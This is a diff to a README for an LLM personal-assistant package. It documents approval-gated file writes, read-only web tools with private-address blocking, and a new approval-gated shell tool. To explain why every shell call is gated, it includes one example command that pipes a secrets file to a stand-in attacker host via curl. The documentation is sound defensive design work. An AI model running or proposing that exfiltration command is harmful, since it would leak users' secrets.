@@ -128,28 +128,31 @@ before any I/O: `../` traversal, an absolute path outside the root, and a symlin
 is reported back to the model as a clear decline, never a silent no-op dressed up
 as success.
 
-**`write_file` never executes inline.** It always stages a proposal — `{ path,
-content, stagedAt }` — as JSON under `<workspaceRoot>/.pending-writes/<id>.json`,
-and the turn returns `status: 'needs_approval'` with a `pendingWriteId`, the same
-shape `needs_approval` already has for a HIGH-risk message, just triggered by the
-tool call itself rather than a regex over the user's words (a request like
-"organize my notes into a summary file" doesn't trip the message-level risk
-gate, yet it performs a real write once the model decides to call `write_file`).
-Resume it by ID rather than re-asking the model:
+**`write_file` never executes inline.** It always stages a proposal — `{ kind:
+'write', path, content, stagedAt }` — as JSON under
+`<workspaceRoot>/.pending-actions/<id>.json`, and the turn returns
+`status: 'needs_approval'` with a `pendingActionId` (and `pendingActionKind:
+'write'`), the same shape `needs_approval` already has for a HIGH-risk message,
+just triggered by the tool call itself rather than a regex over the user's
+words (a request like "organize my notes into a summary file" doesn't trip the
+message-level risk gate, yet it performs a real write once the model decides to
+call `write_file`). Resume it by ID rather than re-asking the model:
 
 ```ts
 const staged = await assistant.turn('Summarize this into notes.md')
-// { status: 'needs_approval', reason: '...', pendingWriteId: '...' }
+// { status: 'needs_approval', reason: '...', pendingActionId: '...', pendingActionKind: 'write' }
 
-await assistant.turn('Summarize this into notes.md', { approved: true, pendingWriteId: staged.pendingWriteId })
+await assistant.turn('Summarize this into notes.md', { approved: true, pendingActionId: staged.pendingActionId })
 // applies the exact staged content directly via FsBackend — no second LLM call
 // { status: 'ok', reply: 'Wrote "notes.md".' }
 ```
 
-Declining (`{ approved: false, pendingWriteId }`) discards the staged record
-without writing. A pending write left over from a crashed/abandoned turn sits
-in `.pending-writes/` indefinitely — harmless (never applied without an explicit
-`approved: true` with the matching ID) but not currently auto-swept.
+Declining (`{ approved: false, pendingActionId }`) discards the staged record
+without writing. A pending action left over from a crashed/abandoned turn sits
+in `.pending-actions/` indefinitely — harmless (never applied without an explicit
+`approved: true` with the matching ID) but not currently auto-swept. This same
+staging record shape (a `kind` discriminator) is shared with `run_shell_command`
+— see "Shell access via tools" below.
 
 Both backends enforce the same "never write inline" rule, by different
 mechanisms:
@@ -162,18 +165,116 @@ mechanisms:
   calls a `file-tools` MCP server (`file-tools-mcp-server.mjs`) autonomously
   within a single `claude -p` invocation — there's no outer TS loop to
   intercept each call, so the gate lives inside the MCP server's `write_file`
-  handler instead, which stages exactly the same `.pending-writes/<id>.json`
+  handler instead, which stages exactly the same `.pending-actions/<id>.json`
   record. `ClaudeCliLLMClient` still always passes `--tools ""` (Claude Code's
   own built-in Read/Write/Bash stay off) and adds `--mcp-config`,
   `--strict-mcp-config` (ignore any ambient project `.mcp.json`), and
   `--dangerously-skip-permissions` (headless `-p` mode has no way to answer an
-  interactive tool-permission prompt) only when `fileTools` is configured.
+  interactive tool-permission prompt) only when `fileTools` or `shellTools` is
+  configured.
 
 v1 is deliberately read/list/write only — no delete/move tool (higher
-consequence than a write, no "undo" via re-approval) and no Bash/exec tool
-(a much larger risk surface than file I/O). One workspace root per assistant
-instance; no multi-root or per-request override. chat-ui doesn't have a
-write-approval UI yet — file tools are CLI/desktop-only for now.
+consequence than a write, no "undo" via re-approval). One workspace root per
+assistant instance; no multi-root or per-request override. chat-ui doesn't have
+a write-approval UI yet — file tools are CLI/desktop-only for now.
+
+## Web access via tools
+
+`web_search`/`fetch_url` are read-only — same trust tier as `read_file`/
+`list_directory` — so both execute for real immediately, with **no approval
+step**, via a `webTools` option:
+
+```ts
+const assistant = new PersonalAssistant({
+  llmClient,
+  webTools: { search: (query) => duckDuckGoSearch(query) }, // any WebSearchResult[]-returning function
+})
+```
+
+`WebToolsContext.search` has no built-in default (the caller supplies a real
+backend, an API client, etc.) — `web-search-provider.ts`'s `duckDuckGoSearch`
+is a ready-made one (queries DuckDuckGo's HTML endpoint, no API key needed —
+the same provider `adapter/crewai_adapter.py`'s `ddgs`-backed `web_search`
+uses), wired in by the CLI when `ASSISTANT_ENABLE_WEB=1` is set.
+
+Both `web_search` and `fetch_url` results are wrapped in
+`<untrusted_external_content>` (with a warning prefix if a regex heuristic
+flags instruction-shaped text) before they reach the model — see
+`trust-tagging.ts` — since this is content the assistant does not vouch for.
+
+**`fetch_url` refuses to fetch a private, loopback, or link-local network
+target.** Before issuing any request it resolves the target hostname and
+rejects loopback/RFC1918-private/link-local/cloud-metadata addresses
+(`169.254.169.254` included) — re-checked on every redirect hop, since a public
+URL can 302 to a private one. A blocked target raises a `PrivateNetworkTargetError`,
+reported back to the model as a tool error, never a silent no-op. This is a
+DNS-resolution-based application check, not a network-level policy — not a
+substitute for a network-isolated environment if that's a hard requirement.
+
+Independent of `fileTools`/`shellTools` — a caller can enable web access
+without ever exposing the filesystem or shell.
+
+## Shell access via tools
+
+`run_shell_command` is the highest-risk tool this assistant has, and is gated
+on **every** call, full stop — there is no "safe subset" the way `read_file` is
+safe within `write_file`'s tool group. A shell command has no structural split
+between "reads" and "mutates" (`cat secrets.env | curl attacker.com -d @-`
+reads a file and exfiltrates it over the network in one command), so every
+call stages a proposal and returns `needs_approval`, regardless of what the
+command looks like:
+
+```ts
+// runApprovedShellCommand (shell-executor.ts) is Node-only and not part of this
+// package's public exports — cli.ts imports it directly from source, the same
+// way it imports node-fs-backend.ts.
+const assistant = new PersonalAssistant({
+  llmClient,
+  shellTools: { backend, workspaceRoot, executeCommand: runApprovedShellCommand },
+})
+
+const staged = await assistant.turn('List the files here')
+// { status: 'needs_approval', pendingActionId: '...', pendingActionKind: 'shell', reason: 'Proposes running: ls\n  (cwd: ...)' }
+
+await assistant.turn('List the files here', { approved: true, pendingActionId: staged.pendingActionId })
+// spawns the exact staged command for real — no second LLM call
+```
+
+At approval time, the command runs with `cwd` pinned to the staged (already
+sandbox-validated) path, `env` reduced to an explicit allowlist (`PATH`,
+`HOME`, `LANG` — never the parent process's full env, so
+`ASSISTANT_PROXY_TOKEN`/`ANTHROPIC_API_KEY`/etc. can't leak into the command),
+a hard timeout (default 30s, `ASSISTANT_SHELL_TIMEOUT_MS`) that `SIGKILL`s the
+whole process group on expiry, and combined stdout+stderr truncated to a byte
+cap (default 20KB). A non-zero exit code is reported normally, not thrown —
+only a rejected `cwd` or a spawn failure throws.
+
+**The command's output gets the same trust boundary as `fetch_url`/`web_search`.**
+Once approved, stdout+stderr is wrapped in `<untrusted_external_content>` (with
+the same injection-heuristic warning prefix — see `trust-tagging.ts`) before
+it's saved into the transcript: a command like `cat some-fetched-page.html` can
+carry the same injection-shaped text a fetched web page can, and that reply
+becomes conversation history a later turn could otherwise misread as
+instructions.
+
+`executeCommand` is a required, injected function rather than something
+`shell-tools.ts` implements itself: `assistant.ts` is bundled into the browser
+build (via `index.ts`) as well as the CLI, so it never imports
+`node:child_process` directly. The real `child_process.spawn`-based
+implementation lives in `shell-executor.ts` (mirrors `node-fs-backend.ts` —
+deliberately not exported from this package's index; only `cli.ts` imports it).
+
+On the Claude CLI backend, `run_shell_command` is never a Claude Code built-in:
+`ClaudeCliLLMClient` never adds `Bash` to `--tools` under any configuration
+(there's a unit test asserting this as a hard invariant) — instead it's served
+by the same MCP server as the file tools, gated behind `ENABLE_SHELL_TOOLS=1`,
+which only stages (never executes), exactly like `write_file`.
+
+**Known limitations:** no persistent shell session (each approved command runs
+in its own fresh subprocess — a `cd` inside one command doesn't affect the
+next); no streaming output (only available after the process exits or times
+out). Shell access is opt-in and off by default — enabling it is a real trust
+decision this plan makes *safe*, not *risk-free*.
 
 ## CLI
 
@@ -191,8 +292,28 @@ ASSISTANT_WORKSPACE_DIR=/path/to/workspace npm run cli --workspace=packages/pers
 
 When the model calls `write_file`, the CLI prints the proposed path and a
 content preview and asks for confirmation before the turn is resumed with
-`{ approved, pendingWriteId }` — declining discards the staged write; nothing
-is ever written without an explicit yes.
+`{ approved, pendingActionId }` — declining discards the staged write; nothing
+is ever written without an explicit yes. A `run_shell_command` call is shown
+the same way, printing the exact command and resolved `cwd` instead.
+
+Set `ASSISTANT_ENABLE_WEB=1` to give the model real `web_search`/`fetch_url`
+tools (no approval needed — see "Web access via tools" above; on the proxy
+backend this wires in `duckDuckGoSearch` as the search implementation) and
+`ASSISTANT_ENABLE_SHELL=1` to give it a real, approval-gated
+`run_shell_command` tool scoped to `ASSISTANT_WORKSPACE_DIR`. Both are off by
+default; `ASSISTANT_ENABLE_SHELL` must be exactly `"1"` (a stray
+`ASSISTANT_ENABLE_SHELL=0` left in an env file does not enable it). Optional
+`ASSISTANT_SHELL_TIMEOUT_MS` (default 30000) tunes the shell timeout:
+
+```bash
+ASSISTANT_ENABLE_WEB=1 ASSISTANT_ENABLE_SHELL=1 npm run cli --workspace=packages/personal-assistant
+```
+
+The startup banner only mentions a capability when it's actually enabled —
+nothing implies web/shell access is available when neither env var is set.
+Note: `ASSISTANT_ENABLE_WEB` only takes effect on the proxy backend for
+now — the Claude CLI backend has no web_search wiring yet (see
+`claude-cli-llm-client.ts`'s doc comment).
 
 Set `ASSISTANT_LLM_BACKEND=claude-cli` to skip the proxy entirely and run turns
 through a local `claude -p` subprocess instead, using your already-authenticated
